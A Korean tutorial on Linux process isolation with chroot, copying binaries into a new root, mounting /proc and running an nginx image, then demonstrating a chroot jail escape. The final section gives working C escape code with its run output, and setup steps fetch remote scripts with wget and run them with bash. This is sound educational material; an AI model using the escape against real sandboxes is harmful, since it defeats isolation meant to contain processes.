# 1. 프로세스 격리
Linux는 모든 게 파일이라고 할 만큼 Linix에서 파일은 중요한 의미이다. 

## Container
FTP, HTTP, SSH 등 다양한 포트를 통해 서버에 접속한다. 해커들도 이러한 방식으로 서버에 침투한다. 해킹 보안 문제를 해결하기 위해 원격으로 들어온 유저를 그 공간에만 가두기 위해서 chroot를 고안해냈다. chroot는 루트 디렉토리 밖으로는 프로세스가 나갈 수 없다. 


<br>

# chroot 
1979년 chroot -> 30여년 후 docker 탄생
```
$ chroot (options) newroot (command)
```
ex) chroot myroot /bin/sh : 커맨드를 지정하지 않으면 $SHELL이 기본값 


먼저 새롭게 나의 'myroot' 디렉토리를 생성해준다. 
```zsh
mkdir myroot
chroot myroot /bin/sh # error
```

<br>

## sh 명령어 복붙
myroot 하위에는 /bin/sh를 실행할 명령어 파일이 존재하지 않는다. 그래서 기존 루트디렉토리에 있는 파일을 복붙해온다.
(linux-vdso.so.1 (0x00007ffc82dba000)는 커널 레이어에 있는 라이브러리라 복사하지 않아도 된다. 그 외에 나머지 2개 라이브러리를 복사해온다)

```zsh
# sh 명령어 파일 찾기
which sh
ldd /bin/sh

root@ubuntu1804:/tmp# which sh
/bin/sh
root@ubuntu1804:/tmp# ldd /bin/sh
	linux-vdso.so.1 (0x00007ffc82dba000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8464e15000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f8465426000)
```

다음은 해당 라이브러리들을 복붙해오는 명령어이다.
```zsh
mkdir -p myroot/bin
cp /bin/sh myroot/bin/
mkdir -p myroot/{lib64,lib/x86_64-linux-gnu}
cp /lib/x86_64-linux-gnu/libc.so.6 myroot/lib/x86_64-linux-gnu/libc.so.6 
cp /lib64/ld-linux-x86-64.so.2 myroot/lib64/ld-linux-x86-64.so.2
```


tree 명령어를 통해 제대로 파일이 복사되었는지 확인해본다.
```zsh
root@ubuntu1804:/tmp# tree myroot
myroot
├── bin
│   └── sh
├── lib
│   └── x86_64-linux-gnu
│       └── libc.so.6
└── lib64
    └── ld-linux-x86-64.so.2

```

이제 다시 myroot에서 chroot 실행하면 정상적으로 동작하는 것을 확인할 수 있다 
```zsh
chroot myroot /bin/sh
```

<br>

## ls 명령어 복붙
그 다음으로 'ls' 명령어를 복붙해오자.
```zsh
wget https://raw.githubusercontent.com/loosie/code_playground/master/linux/container/scripts/chroot_ls.sh;
bash chroot_ls.sh;
```

그럼 이제 root를 변경 후 파일 목록을 확인할 수 있다. cd 명령어로 어떻게 해도 해당 루트를 벗어날 수 없는 것을 확인해보자.
```zsh
root@ubuntu1804:/tmp# chroot myroot /bin/sh
# ls
bin  lib  lib64  usr
# cd ..
# cd ../../../
# cd ../
# ls
bin  lib  lib64  usr
# cd ..
# cd /
# ls /
bin  lib  lib64  usr
```

<br>

## mkdir, mount, ps 명령어 복붙
```zsh
wget https://raw.githubusercontent.com/sam0kim/container-internal/main/scripts/chroot_ps.sh;
bash chroot_ps.sh;
```

프로세스 격리에 필요한 라이브러리들을 모두 복붙해왔다
```zsh
root@ubuntu1804:/tmp# tree myroot
myroot
├── bin
│   ├── ls
│   ├── mkdir
│   ├── mount
│   ├── ps
│   └── sh
├── lib
│   └── x86_64-linux-gnu
│       ├── libblkid.so.1
│       ├── libc.so.6
│       ├── libdl.so.2
│       ├── libgcrypt.so.20
│       ├── libgpg-error.so.0
│       ├── liblzma.so.5
│       ├── libmount.so.1
│       ├── libpcre.so.3
│       ├── libprocps.so.6
│       ├── libpthread.so.0
│       ├── librt.so.1
│       ├── libselinux.so.1
│       ├── libsystemd.so.0
│       └── libuuid.so.1
├── lib64
│   └── ld-linux-x86-64.so.2
└── usr
    └── lib
        └── x86_64-linux-gnu
            └── liblz4.so.1
```

ps 명령어를 실행하면 다음과 같이 에러문구가 나온다
```zsh
root@ubuntu1804:/tmp# chroot myroot /bin/sh
# ps
Error, do this: mount -t proc proc /proc
#  mount -t proc proc /proc
mount: /proc: mount point does not exist.
```

ps 명령어를 실행하기 위해서는 proc을 mount해야하는데 mount 포인트(부착하는 위치 ex. usb)가 존재하지 않는다고 한다. mkdir, mount 명령어를 통해 /proc라는 포인트를 만들어주고 다시 mount해주면 된다.
```zsh
mkdir /proc
mount -t proc proc /proc
ps
  PID TTY          TIME CMD
 1765 ?        00:00:00 sudo
 1766 ?        00:00:00 bash
 1979 ?        00:00:00 sh
 1984 ?        00:00:00 ps
 ```

## 실습환경 초기화
직접 명령어들을 가져온 다음에 chroot로 루트디렉토리를 변경해보았다. 이렇게 하나하나 명령어를 복사하기가 너무 번거롭다. 그래서 image라는 개념을 사용하는 것이다. mount 해놓은 환경은 초기화시켜주자.
``` zsh
mount # 해당 명령어를 통해 mount된 목록 확인 가능  
umount /tmp/myroot/proc # proc 언마운트 
```

[]

## docker image(nginx)로 chroot
남이 만든 이미지로 chroot를 해보자
- $(docker create nginx): 서브쉘 명령어, 먼저 실행된다. nginx를 docker 레포지토리로부터 다운로드받아 생성한다.
- | tar -C nginx-root -xvf - : 파이프로 받아서 nginx 압축을 nginx-root에 푼다(-xvf)
- `tree -L 1 nginx-root` 로 제대로 다운이 되었는지 확인해보고 chroot를 한다 
```zsh
mkdir nginx-root;
docker export $(docker create nginx) | tar -C nginx-root -xvf -;
chroot nginx-root /bin/sh;
```

정상적으로 nginx-root가 루트로 바뀌고 기본 설정이 대부분 되어있는 것을 확인할 수 있다.

### nginx 구동
```
nginx -g "daemon off;"
```

정상적으로 구동되고 있는지는 host에서 확인해보면 된다
```zsh
root@ubuntu1804:/tmp# curl localhost:80
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

<br>

# chroot 해킹
docker 레포지토리 이미지 다운로드받아서 chroot하면 쉽게 컨테이너를 구동할 수 있겠다는 생각이 들 수도 있지만 지금같이 컨테이너를 만든다면 탈옥 해킹이 가능하다. 

```c
// /tmp/escape_chroot.c
#include <sys/stat.h>
#include <unistd.h>

int main(void)
{
   mkdir(".out", 0755);
   chroot(".out");
   chdir("../../../../../");
   chroot(".");
   return execl("/bin/sh", "-i", NULL);
}
```

c 파일 생성 후 myroot에 컴파일한다
```zsh
root@ubuntu1804:/tmp# vi escape_chroot.c
root@ubuntu1804:/tmp# gcc -o myroot/escape_chroot escape_chroot.c
root@ubuntu1804:/tmp# tree -L 1 myroot
myroot
├── bin
├── escape_chroot
├── lib
├── lib64
├── proc
└── usr
```

그리고 chroot 후에 다음 파일을 실행하면 탈옥이 성공된다. 실제 루트 디렉토리에 접근할 수 있다
``` zsh
chroot myroot /bin/sh
./escape_chroot
ls

root@ubuntu1804:/tmp# chroot myroot /bin/sh
# ls
bin  escape_chroot  lib  lib64	proc  usr
# cd ../../
# cd ../../../../
# ./escape_chroot
# ls
bin   home	      lib64	  opt	sbin  usr      vmlinuz.old
boot  initrd.img      lost+found  proc	srv   vagrant
dev   initrd.img.old  media	  root	sys   var
etc   lib	      mnt	  run	tmp   vmlinuz
```

<br>

# refs
- https://youtu.be/lVtgqmjv4BQ
- https://netpple.github.io/docs/make-container-without-docker/